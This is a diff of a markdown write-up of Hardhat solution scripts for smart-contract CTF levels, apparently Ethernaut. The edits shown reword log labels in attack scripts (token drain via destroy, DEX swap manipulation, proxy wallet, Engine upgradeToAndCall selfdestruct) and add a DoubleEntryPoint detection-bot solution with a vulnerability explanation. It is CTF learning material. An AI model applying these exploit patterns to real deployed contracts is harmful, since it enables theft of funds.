@@ -609,7 +609,7 @@ async function main() {
   console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);
 
   const [ signer ] = await hre.ethers.getSigners();
-  console.log(`Player address = ${signer.address}`);
+  console.log(`Player address: ${signer.address}`);
   (await token.destroy(signer.address)).wait();
   console.log("Attack complete");
   console.log(`SimpleToken contract balance: ${await hre.ethers.provider.getBalance(await token.getAddress())}`);
@@ -846,7 +846,7 @@ async function main() {
     const [ amount1, swapAmount1 ] = await calculateAmounts(true);
 
     console.log(
-      "Target, Player, amount swapAmount = " +
+      "Target, Player, amount, swapAmount = " +
       `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
       `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}, ` +
       `${amount1} ${swapAmount1}`
@@ -858,7 +858,7 @@ async function main() {
     const [ amount2, swapAmount2 ] = await calculateAmounts(false);
 
     console.log(
-      "Target, Player, amount swapAmount = " +
+      "Target, Player, amount, swapAmount = " +
       `${await targetContract.balanceOf(token1, targetAddress)} ${await targetContract.balanceOf(token2, targetAddress)}, ` +
       `${await targetContract.balanceOf(token1, signer.address)} ${await targetContract.balanceOf(token2, signer.address)}, ` +
       `${amount2} ${swapAmount2}`
@@ -1001,7 +1001,7 @@ async function main() {
   (await walletContract.addToWhitelist(signer.address)).wait();
 
   console.log(
-    "Wallet balance, Wallet.balances(player) = " +
+    "Wallet balance, Wallet balances[player] = " +
     `${await hre.ethers.provider.getBalance(proxyAddress)}, ` +
     `${await walletContract.balances(signer.address)}`
   );
@@ -1012,7 +1012,7 @@ async function main() {
   ], {value: await hre.ethers.provider.getBalance(proxyAddress)})).wait();
 
   console.log(
-    "Wallet balance, Wallet.balances(player) = " +
+    "Wallet balance, Wallet balances[player] = " +
     `${await hre.ethers.provider.getBalance(proxyAddress)}, ` +
     `${await walletContract.balances(signer.address)}`
   );
@@ -1073,7 +1073,7 @@ async function main() {
   await attackContract.waitForDeployment();
   console.log(`EngineAttack address: ${await attackContract.getAddress()}`);
 
-  console.log(`EngineAttack.horsePower = ${await engineContract.horsePower()}`);
+  console.log(`EngineAttack horsePower = ${await engineContract.horsePower()}`);
 
   (await engineContract.upgradeToAndCall(
     await attackContract.getAddress(),
@@ -1081,7 +1081,7 @@ async function main() {
   )).wait();
 
   // Verify the Engine contract has selfdestructed (this should raise an exception)
-  console.log(`EngineAttack.horsePower = ${await engineContract.horsePower()}`);
+  console.log(`EngineAttack horsePower = ${await engineContract.horsePower()}`);
 }
 
 main().catch((error) => {
@@ -1089,3 +1089,65 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 26 DoubleEntryPoint
+
+- Change the DoubleEntryPoint.sol imports to be
+  - `@openzeppelin/contracts/token/ERC20/ERC20.sol`
+  - `@openzeppelin/contracts/access/Ownable.sol`
+- Run `npm install @openzeppelin/contracts`
+
+```sol
+pragma solidity ^0.8.0;
+
+import "./DoubleEntryPoint.sol";
+
+contract DetectionBot {
+  address cryptoVault;
+
+  constructor(address _cryptoVault) {
+    cryptoVault = _cryptoVault;
+  }
+
+  function handleTransaction(address user, bytes calldata msgData) external {
+    // Only DoubleEntryPoint.delegateTransfer has the fortaNotify modifier,
+    // ie no need to check the function signature here
+    (,, address origSender) = abi.decode(msgData[4:], (address, uint256, address));
+    if (origSender == cryptoVault)
+      IForta(msg.sender).raiseAlert(user);
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const doubleEntryPoint = (await hre.ethers.getContractFactory("DoubleEntryPoint")).attach("0xDA0783B7eb9c9d3cD179B1c425908a21086117E6");
+  const cryptoVault = (await hre.ethers.getContractFactory("CryptoVault")).attach(await doubleEntryPoint.cryptoVault());
+  const legacyToken = (await hre.ethers.getContractFactory("LegacyToken")).attach(await doubleEntryPoint.delegatedFrom());
+
+  console.log(`CryptoVault underlying == DoubleEntryPoint = ${await cryptoVault.underlying() == await doubleEntryPoint.getAddress()}`);
+  console.log(`LegacyToken delegate == DoubleEntryPoint = ${await legacyToken.delegate() == await doubleEntryPoint.getAddress()}`);
+
+  // The vulnerability is that calling CryptoToken.sweepToken with LegacyToken causes DoubleEntryPoint tokens to be swept:
+  //   CryptoVault.sweepToken(LegacyToken)
+  //   LegacyToken.transfer(CryptoVault.sweptTokensRecipient, LegacyToken.balanceOf(CryptoVault))
+  //   DoubleEntryPoint.delegateTransfer(CryptoVault.sweptTokensRecipient, LegacyToken.balanceOf(CryptoVault), CryptoVault)
+  //   DoubleEntryPoint._transfer(CryptoVault, CryptoVault.sweptTokensRecipient, LegacyToken.balanceOf(CryptoVault))
+
+  // This can be prevented by alerting on any DoubleEntryPoint.delegateTransfer where origSender == CryptoVault
+
+  const detectionBot = await hre.ethers.deployContract("DetectionBot", [await cryptoVault.getAddress()]);
+  await detectionBot.waitForDeployment();
+
+  const forta = (await hre.ethers.getContractFactory("Forta")).attach(await doubleEntryPoint.forta());
+  await forta.setDetectionBot(await detectionBot.getAddress());
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
+
